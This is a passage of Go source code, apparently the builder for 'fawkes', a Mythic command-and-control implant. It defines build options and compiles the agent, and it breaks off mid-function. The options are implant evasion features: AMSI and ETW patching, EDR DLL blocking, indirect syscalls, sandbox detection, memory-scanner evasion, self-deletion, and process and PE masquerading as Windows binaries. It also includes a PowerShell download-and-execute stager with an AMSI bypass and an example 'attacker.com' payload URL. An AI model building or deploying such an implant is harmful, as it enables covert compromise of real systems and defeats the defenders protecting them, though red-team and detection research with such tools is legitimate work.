package agentfunctions

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// buildMu serializes agent builds to prevent concurrent builds from interfering
// with each other's padding.bin file. Each build writes custom padding data to
// a shared file path before compiling, so overlapping builds would corrupt each
// other's embedded padding.
var buildMu sync.Mutex

var payloadDefinition = agentstructs.PayloadType{
	Name:                                   "fawkes",
	FileExtension:                          "bin",
	Author:                                 "@galoryber",
	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
	Wrapper:                                false,
	CanBeWrappedByTheFollowingPayloadTypes: []string{},
	SupportsDynamicLoading:                 false,
	Description:                            "fawkes agent",
	SupportedC2Profiles:                    []string{"http", "tcp", "discord", "httpx"},
	MythicEncryptsData:                     true,
	MessageFormat:                          agentstructs.MessageFormatJSON,
	BuildParameters: []agentstructs.BuildParameter{
		{
			Name:          "mode",
			Description:   "Choose the build mode option. Select default for executables, shared for a .dll or .so file,  shellcode to use sRDI to convert the DLL to windows shellcode",
			Required:      false,
			DefaultValue:  "default-executable",
			Choices:       []string{"default-executable", "shared", "windows-shellcode", "windows-ps-stager"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "architecture",
			Description:   "Choose the agent's architecture",
			Required:      false,
			DefaultValue:  "amd64",
			Choices:       []string{"amd64", "386", "arm", "arm64", "mips", "mips64"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "garble",
			Description:   "Use Garble to obfuscate the output Go executable.\nWARNING - This significantly slows the agent build time.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "inflate_bytes",
			Description:   "Optional: Hex bytes to inflate binary with (e.g. 0x90 or 0x41,0x42). Used with inflate_count to lower entropy or increase file size.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "inflate_count",
			Description:   "Optional: Number of times to repeat the inflate bytes (e.g. 3000 = 3000 repetitions of the byte pattern).",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "host_header",
			Description:   "Optional: Override the Host header in HTTP requests. Used for domain fronting — set this to the real C2 domain while callback_host points to the CDN edge.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "proxy_url",
			Description:   "Optional: Route agent traffic through an HTTP/SOCKS proxy (e.g. http://proxy:8080 or socks5://127.0.0.1:1080).",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "fallback_hosts",
			Description:   "Optional: Comma-separated fallback C2 callback hosts for automatic failover. If the primary callback_host is unreachable, the agent cycles through these. Same port and encryption as primary. E.g. 'http://backup1.example.com,https://backup2.example.com'.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "tls_verify",
			Description:   "TLS certificate verification mode. 'none' = skip verification (default). 'system-ca' = use OS trust store. 'pinned:<sha256hex>' = pin to specific certificate fingerprint (e.g. pinned:a1b2c3...).",
			Required:      false,
			DefaultValue:  "none",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "tls_fingerprint",
			Description:   "TLS ClientHello fingerprint to mimic. Spoofs the JA3/JA3S hash to match a real browser. 'go' = default Go TLS stack (no spoofing). 'chrome' = Chrome/Chromium. 'firefox' = Firefox. 'safari' = Safari. 'edge' = Edge. 'random' = randomized fingerprint.",
			Required:      false,
			DefaultValue:  "chrome",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
			Choices:       []string{"chrome", "firefox", "safari", "edge", "random", "go"},
		},
		{
			Name:          "working_hours_start",
			Description:   "Optional: Working hours start time in HH:MM 24-hour format (e.g. '09:00'). Agent only calls back during working hours. Leave empty for always-active.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "working_hours_end",
			Description:   "Optional: Working hours end time in HH:MM 24-hour format (e.g. '17:00'). Agent only calls back during working hours. Leave empty for always-active.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "working_days",
			Description:   "Optional: Comma-separated ISO weekday numbers when agent is active (Mon=1, Sun=7). E.g. '1,2,3,4,5' for weekdays only. Leave empty for all days.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "tcp_bind_address",
			Description:   "Optional: TCP P2P bind address (e.g. '0.0.0.0:7777'). When set, the agent operates in TCP P2P mode — it listens for a parent agent connection instead of using HTTP. Leave empty for HTTP egress mode.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "namedpipe_bind_name",
			Description:   "Optional: Named pipe P2P name (e.g. 'msrpc-f9a1'). Windows only. When set, the agent listens on a named pipe for parent connections via SMB (port 445). Stealthier than TCP — blends with normal Windows traffic. Leave empty to use TCP.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "env_key_hostname",
			Description:   "Optional: Environment key — regex pattern the hostname must match (e.g. '.*\\.contoso\\.com' or 'WORKSTATION-\\d+'). Agent exits silently before checkin if hostname doesn't match. Leave empty to skip.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "env_key_domain",
			Description:   "Optional: Environment key — regex pattern the domain must match (e.g. 'CONTOSO' or '.*\\.local'). Agent exits silently before checkin if domain doesn't match. Leave empty to skip.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "env_key_username",
			Description:   "Optional: Environment key — regex pattern the current username must match (e.g. 'admin.*' or 'svc_.*'). Agent exits silently before checkin if username doesn't match. Leave empty to skip.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "env_key_process",
			Description:   "Optional: Environment key — process name that must be running on the system (e.g. 'outlook.exe' or 'slack'). Agent exits silently before checkin if process not found. Leave empty to skip.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "self_delete",
			Description:   "Delete the agent binary from disk after execution starts. Reduces forensic artifacts. On Linux/macOS, the file is removed immediately (process continues from memory). On Windows, uses NTFS stream rename technique.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "masquerade_name",
			Description:   "Optional: Masquerade the agent process name on Linux. Changes /proc/self/comm (visible in ps, top, htop). Max 15 chars. Examples: '[kworker/0:1]', 'sshd', 'apache2', '[migration/0]'. Leave empty to skip.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "auto_patch",
			Description:   "Automatically patch ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) at agent startup. Prevents ETW-based detection and AMSI scanning before any agent activity. Windows only — no-op on Linux/macOS.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "obfuscate_strings",
			Description:   "XOR-encode C2 config strings (callback host, URIs, user agent, encryption key, UUID) at build time. Prevents trivial IOC extraction via 'strings' on the binary. Decoded at runtime with a per-build random key.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "block_dlls",
			Description:   "Block non-Microsoft DLLs from being loaded in child processes spawned by the agent (run, powershell). Prevents EDR from injecting monitoring DLLs. Windows only — no-op on Linux/macOS.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "indirect_syscalls",
			Description:   "Enable indirect syscalls at startup. Resolves Nt* syscall numbers from ntdll export table and generates stubs that jump to ntdll's syscall;ret gadget. Injection commands will use indirect syscalls to bypass userland API hooks. Windows only — no-op on Linux/macOS.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "sandbox_guard",
			Description:   "Detect sandbox time-acceleration (sleep skipping). If the agent's sleep is fast-forwarded by a sandbox, it exits silently. Prevents execution in automated analysis environments.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "dll_exports",
			Description:   "DLL export set (shared/shellcode mode only). 'standard' = Run, Fire, VoidFunc. 'full' adds DllRegisterServer (regsvr32 T1218.010), DllUnregisterServer, ServiceMain (svchost DLL service), DllGetClassObject + DllCanUnloadNow (COM hijack T1546.015).",
			Required:      false,
			DefaultValue:  "standard",
			Choices:       []string{"standard", "full"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "content_types",
			Description:   "Comma-separated Content-Type values to cycle through for HTTP POST requests. The agent rotates through the list round-robin. Empty uses default (application/x-www-form-urlencoded). Example: 'application/json,text/plain,application/x-www-form-urlencoded'. URI paths support randomization tokens: {rand:N} for N hex chars, {int:M-N} for random integer in range.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		// body_transforms removed: agent-side transforms without matching C2 server
		// support silently corrupt traffic. Use httpx C2 profile for malleable transforms.
		{
			Name:          "sleep_mask",
			Description:   "Encrypt sensitive agent and C2 data in memory during sleep cycles. Uses AES-256-GCM with a random per-cycle key. Process memory dumps during sleep only reveal encrypted blobs — not C2 URLs, encryption keys, or UUIDs. C2 profile fields are only masked when no tasks are actively running.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "sleep_guard_pages",
			Description:   "Protect sleep vault memory with PAGE_NOACCESS during sleep. After encrypting sensitive data, vault pages are VirtualProtect'd to NO_ACCESS — EDR memory scanners get STATUS_ACCESS_VIOLATION when scanning agent memory during sleep. Requires sleep_mask=true. Windows only.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "user_agent_pool",
			Description:   "Optional: Newline-separated list of User-Agent strings. When set, the agent rotates through the pool per-request instead of using a single static User-Agent. Reduces network fingerprinting. Leave empty to use the default Chrome UA.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "kill_date",
			Description:   "Optional: UTC date/time after which the agent will self-terminate (format: YYYY-MM-DD or YYYY-MM-DD HH:MM). Leave empty for no kill date. Enforced every tasking cycle.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "stager_url",
			Description:   "PowerShell stager: URL to download the full payload from (e.g., https://attacker.com/payload.exe). The stager will download from this URL and execute. Only used with windows-ps-stager mode.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "stager_amsi_bypass",
			Description:   "PowerShell stager: Include AMSI bypass in the stager script. Patches AmsiScanBuffer before downloading the payload to prevent detection of the download cradle.",
			Required:      false,
			DefaultValue:  true,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "http_timeout",
			Description:   "HTTP request timeout in seconds. Controls how long the agent waits for C2 server responses. Default: 30. Increase for high-latency networks, decrease for faster failure detection.",
			Required:      false,
			DefaultValue:  "30",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "max_retries",
			Description:   "Maximum number of consecutive failed checkin attempts before the agent self-terminates. Default: 10. Set to 0 for unlimited retries.",
			Required:      false,
			DefaultValue:  "10",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "recovery_interval",
			Description:   "Seconds between recovery attempts for unhealthy C2 domains. When a domain fails repeatedly, it is marked unhealthy and skipped. After this interval, the agent retries it. Default: 600 (10 minutes). Only relevant when using multiple domains/fallback hosts.",
			Required:      false,
			DefaultValue:  "600",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_preset",
			Description:   "Windows PE metadata preset — impersonate a legitimate Windows binary's version info (visible in File Properties > Details and Task Manager). Individual pe_* fields override preset values. Windows only — ignored for Linux/macOS.",
			Required:      false,
			DefaultValue:  "none",
			Choices:       []string{"none", "notepad", "svchost", "cmd", "explorer", "msiexec", "dllhost", "rundll32", "conhost", "taskhostw", "RuntimeBroker"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "pe_company",
			Description:   "Optional: CompanyName in PE version info (e.g. 'Microsoft Corporation'). Visible in File Properties > Details. Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_description",
			Description:   "Optional: FileDescription in PE version info (e.g. 'Windows Notepad'). Visible in File Properties and Task Manager description column. Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_product",
			Description:   "Optional: ProductName in PE version info (e.g. 'Microsoft® Windows® Operating System'). Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_version",
			Description:   "Optional: File and product version string (e.g. '10.0.19041.1'). Format: Major.Minor.Patch.Build. Visible in File Properties > Details. Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_copyright",
			Description:   "Optional: LegalCopyright in PE version info (e.g. '© Microsoft Corporation. All rights reserved.'). Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_original_filename",
			Description:   "Optional: OriginalFilename in PE version info (e.g. 'NOTEPAD.EXE'). Visible to forensic tools regardless of actual filename on disk. Overrides preset. Windows only.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "pe_icon",
			Description:   "Optional: Custom icon file (.ico or .png). Displayed in Windows Explorer, taskbar, and Alt-Tab. Upload an icon to visually impersonate a legitimate application. Windows only.",
			Required:      false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_FILE,
		},
		{
			Name:          "pe_manifest",
			Description:   "UAC manifest execution level embedded in the PE. Controls Windows elevation prompt behavior. 'asInvoker' = run with caller's token (default, no prompt). 'highestAvailable' = elevate if user is admin. 'requireAdministrator' = always prompt for elevation. Windows only.",
			Required:      false,
			DefaultValue:  "none",
			Choices:       []string{"none", "asInvoker", "highestAvailable", "requireAdministrator"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
	},
	BuildSteps: []agentstructs.BuildStep{
		{
			Name:        "Configuring",
			Description: "Cleaning up configuration values and generating the golang build command",
		},
		{
			Name:        "PE Resources",
			Description: "Embedding Windows PE version info, icon, and manifest",
		},
		{
			Name:        "Compiling",
			Description: "Compiling the golang agent (maybe with obfuscation via garble)",
		},
		{
			Name:        "YARA Scan",
			Description: "Scanning payload against detection rules (informational only)",
		},
		{
			Name:        "Entropy Analysis",
			Description: "Analyzing payload entropy characteristics (informational only)",
		},
		{
			Name:        "Reporting back",
			Description: "Sending the payload back to Mythic",
		},
	},
}

func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	payloadBuildResponse := agentstructs.PayloadBuildResponse{
		PayloadUUID:        payloadBuildMsg.PayloadUUID,
		Success:            true,
		UpdatedCommandList: &payloadBuildMsg.CommandList,
	}

	if len(payloadBuildMsg.C2Profiles) > 1 || len(payloadBuildMsg.C2Profiles) == 0 {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = "Failed to build - must select only one C2 Profile at a time"
		return payloadBuildResponse
	}
	macOSVersion := "10.12"
	targetOs := "linux"
	if payloadBuildMsg.SelectedOS == "macOS" {
		targetOs = "darwin"
	} else if payloadBuildMsg.SelectedOS == "Windows" {
		targetOs = "windows"
	}
	// Build Go linker flags (-ldflags) from C2 profile and build parameters.
	// This sets compile-time variables via -X flags for C2 config, opsec options, etc.
	fawkes_main_package := "main"
	ldflags, ldflagsErr := buildConfigLdflags(payloadBuildMsg, fawkes_main_package)
	if ldflagsErr != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = ldflagsErr.Error()
		return payloadBuildResponse
	}

	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	mode, err := payloadBuildMsg.BuildParameters.GetStringArg("mode")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	garble, err := payloadBuildMsg.BuildParameters.GetBooleanArg("garble")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	// Validate mode for target OS
	if mode == "windows-shellcode" && targetOs != "windows" {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = "windows-shellcode mode is only supported for Windows targets"
		return payloadBuildResponse
	}
	if mode == "windows-ps-stager" && targetOs != "windows" {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = "windows-ps-stager mode is only supported for Windows targets"
		return payloadBuildResponse
	}

	// Handle PowerShell stager mode early — no Go build needed
	if mode == "windows-ps-stager" {
		return buildPowerShellStager(payloadBuildMsg, &payloadBuildResponse)
	}
	// Add debug flag
	ldflags += fmt.Sprintf(" -X '%s.debug=%s'", fawkes_main_package, "false")
	ldflags += " -buildid="

	// Serialize builds: padding.bin is a shared file that must not be modified
	// by concurrent goroutines between the write and the go build invocation.
	buildMu.Lock()
	defer buildMu.Unlock()

	// Handle binary inflation (padding)
	inflateBytes, inflBytesErr := payloadBuildMsg.BuildParameters.GetStringArg("inflate_bytes")
	inflateCount, inflCountErr := payloadBuildMsg.BuildParameters.GetStringArg("inflate_count")
	if inflBytesErr != nil {
		fmt.Printf("[builder] Warning: could not read inflate_bytes parameter: %v\n", inflBytesErr)
	}
	if inflCountErr != nil {
		fmt.Printf("[builder] Warning: could not read inflate_count parameter: %v\n", inflCountErr)
	}
	paddingFile := "./fawkes/agent_code/padding.bin"
	fmt.Printf("[builder] inflate_bytes='%s' inflate_count='%s'\n", inflateBytes, inflateCount)

	if inflateBytes != "" && inflateCount != "" {
		count, countErr := strconv.Atoi(strings.TrimSpace(inflateCount))
		if countErr != nil || count <= 0 {
			// Invalid count, write default 1-byte padding
			if writeErr := os.WriteFile(paddingFile, []byte{0x00}, 0644); writeErr != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to write default padding file: %v", writeErr)
				return payloadBuildResponse
			}
		} else {
			// Parse hex bytes like "0x41,0x42" or "0x90"
			bytePattern, parseErr := parseInflateHexBytes(inflateBytes)
			if parseErr != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to parse inflate bytes: %v", parseErr)
				return payloadBuildResponse
			}
			// Build the full padding data by repeating the pattern count times
			paddingData := generatePaddingData(bytePattern, count)
			if writeErr := os.WriteFile(paddingFile, paddingData, 0644); writeErr != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to write padding file: %v", writeErr)
				return payloadBuildResponse
			}
			// Verify the file was written correctly
			if fi, statErr := os.Stat(paddingFile); statErr == nil {
				fmt.Printf("[builder] Generated padding.bin: %d bytes (%d repetitions of %d-byte pattern), file on disk: %d bytes\n", len(paddingData), count, len(bytePattern), fi.Size())
			} else {
				fmt.Printf("[builder] Generated padding.bin: %d bytes (%d repetitions of %d-byte pattern), stat error: %v\n", len(paddingData), count, len(bytePattern), statErr)
			}
		}
	} else {
		// No inflation requested, write minimal default
		fmt.Printf("[builder] No inflation requested, writing default 1-byte padding.bin\n")
		if writeErr := os.WriteFile(paddingFile, []byte{0x00}, 0644); writeErr != nil {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to write default padding file: %v", writeErr)
			return payloadBuildResponse
		}
	}
	// Defer cleanup: restore default padding.bin after build completes
	defer func() {
		if writeErr := os.WriteFile(paddingFile, []byte{0x00}, 0644); writeErr != nil {
			fmt.Printf("[builder] Warning: failed to restore default padding file: %v\n", writeErr)
		}
	}()

	// PE Resource Embedding (Windows only)
	agentCodeDir := "./fawkes/agent_code/"
	if targetOs == "windows" {
		peConfig, peErr := collectPEResourceConfig(payloadBuildMsg)
		if peErr != nil {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildStdErr = fmt.Sprintf("PE resource config error: %v", peErr)
			return payloadBuildResponse
		}
		if peConfig.hasResources() {
			peReport, peErr := generatePEResources(agentCodeDir, architecture, peConfig)
			if peErr != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = fmt.Sprintf("PE resource generation failed: %v", peErr)
				mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
					PayloadUUID: payloadBuildMsg.PayloadUUID,
					StepName:    "PE Resources",
					StepSuccess: false,
					StepStdout:  fmt.Sprintf("Failed: %v", peErr),
				})
				return payloadBuildResponse
			}
			// Defer cleanup of .syso file
			sysoFile := filepath.Join(agentCodeDir, fmt.Sprintf("rsrc_windows_%s.syso", architecture))
			defer os.Remove(sysoFile)
			mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: payloadBuildMsg.PayloadUUID,
				StepName:    "PE Resources",
				StepSuccess: true,
				StepStdout:  peReport,
			})
		} else {
			mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: payloadBuildMsg.PayloadUUID,
				StepName:    "PE Resources",
				StepSuccess: true,
				StepStdout:  "No PE resources requested — skipping (default Go binary metadata)",
			})
		}
	} else {
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "PE Resources",
			StepSuccess: true,
			StepStdout:  fmt.Sprintf("Skipped — PE resources only apply to Windows (target: %s)", targetOs),
		})
	}

	goarch := architecture
	tags := payloadBuildMsg.C2Profiles[0].Name
	// Clear both Go and Garble build caches to ensure embedded files (padding.bin)
	// are re-read from disk. Garble has its own cache (~/.cache/garble) separate
	// from GOCACHE — without clearing it, Garble reuses stale cached objects
	// even when the underlying embedded file has changed.
	command := fmt.Sprintf("rm -rf /deps; go clean -cache 2>/dev/null; rm -rf \"${HOME}/.cache/garble\" 2>/dev/null; CGO_ENABLED=0 GOOS=%s GOARCH=%s ", targetOs, goarch)
	buildmodeflag := "default"
	if mode == "shared" || mode == "windows-shellcode" {
		buildmodeflag = "c-shared"
		tags += ",shared" // Add shared tag to include exports.go
		command = strings.Replace(command, "CGO_ENABLED=0", "CGO_ENABLED=1", 1)
		// Add extended DLL exports (regsvr32, ServiceMain, COM) when requested
		if dllExports, err := payloadBuildMsg.BuildParameters.GetStringArg("dll_exports"); err == nil && dllExports == "full" {
			tags += ",dllexports"
		}
	}
	goCmd := fmt.Sprintf("-trimpath -tags %s -buildmode %s -ldflags \"%s\"", tags, buildmodeflag, ldflags)
	if mode == "shared" || mode == "windows-shellcode" {
		if targetOs == "darwin" {
			command += "CC=o64-clang CXX=o64-clang++ "
		} else if targetOs == "windows" {
			command += "CC=x86_64-w64-mingw32-gcc "
		} else {
			if goarch == "arm64" {
				command += "CC=aarch64-linux-gnu-gcc "
			}
		}
	}
	// Enable CGO for Windows builds (needed for go-coff BOF execution)
	if targetOs == "windows" && mode != "shared" {
		command = strings.Replace(command, "CGO_ENABLED=0", "CGO_ENABLED=1", 1)
		if goarch == "amd64" {
			command += "CC=x86_64-w64-mingw32-gcc "
		} else if goarch == "386" {
			command += "CC=i686-w64-mingw32-gcc "
		}
	}
	// GOGARBLE scopes which packages garble obfuscates. Using "fawkes" restricts
	// obfuscation to our agent code only, avoiding OOM on large dependency files
	// (e.g., go-msrpc/win32_errors.go has ~2700 string literals that exhaust RAM
	// when -literals tries to obfuscate them all with GOGARBLE=*).
	command += "GOGARBLE=fawkes "
	if garble {
		command += "/go/bin/garble -tiny -literals -seed random build "
	} else {
		command += "go build "
	}
	payloadName := fmt.Sprintf("%s-%s", payloadBuildMsg.PayloadUUID, targetOs)
	if targetOs == "darwin" {
		payloadName += fmt.Sprintf("-%s", macOSVersion)
	}
	payloadName += fmt.Sprintf("-%s", goarch)

	// Add file extension based on mode before constructing the build command
	if mode == "shared" {
		if targetOs == "windows" {
			payloadName += ".dll"
		} else if targetOs == "darwin" {
			payloadName += ".dylib"
		} else {
			payloadName += ".so"
		}
	} else if mode == "windows-shellcode" {
		payloadName += ".dll"
		// Build as DLL first, then convert to shellcode via Merlin's sRDI
	}

	command += fmt.Sprintf("%s -o /build/%s .", goCmd, payloadName)

	// Build configuring step output with padding info
	configuringOutput := fmt.Sprintf("Successfully configured\n%s", command)
	if inflateBytes != "" && inflateCount != "" {
		configuringOutput += fmt.Sprintf("\nBinary inflation: bytes=%s count=%s", inflateBytes, inflateCount)
	}
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "Configuring",
		StepSuccess: true,
		StepStdout:  configuringOutput,
	})
	cmd := exec.Command("/bin/bash")
	fmt.Println("build command : " + command)
	cmd.Stdin = strings.NewReader(command)
	cmd.Dir = "./fawkes/agent_code/"
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Compilation failed with errors"
		payloadBuildResponse.BuildStdErr = stderr.String() + "\n" + err.Error()
		payloadBuildResponse.BuildStdOut = stdout.String()
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Compiling",
			StepSuccess: false,
			StepStdout:  fmt.Sprintf("failed to compile\n%s\n%s\n%s", stderr.String(), stdout.String(), err.Error()),
		})
		return payloadBuildResponse
	} else {
		outputString := stdout.String()
		if !garble {
			// only adding stderr if garble is false, otherwise it's too much data
			outputString += "\n" + stderr.String()
		}

		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Compiling",
			StepSuccess: true,
			StepStdout:  fmt.Sprintf("Successfully executed\n%s", outputString),
		})
	}
	if !garble {
		payloadBuildResponse.BuildStdErr = stderr.String()
	}
	payloadBuildResponse.BuildStdOut = stdout.String()

	// YARA scan: run detection rules against the built payload (informational only)
	yaraOutput := runYARAScan(fmt.Sprintf("/build/%s", payloadName))
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "YARA Scan",
		StepSuccess: true,
		StepStdout:  yaraOutput,
	})

	// Entropy analysis: run ent on the built payload (informational only)
	entropyOutput := runEntropyScan(fmt.Sprintf("/build/%s", payloadName))
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "Entropy Analysis",
		StepSuccess: true,
		StepStdout:  entropyOutput,
	})

	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Failed to find final payload"
	} else if mode == "windows-shellcode" {
		// Convert DLL to shellcode using sRDI
		// Use "Run" function and clearHeader=true to match Merlin configuration
		shellcode, err := convertDllToShellcode(payloadBytes, "Run", true)
		if err != nil {
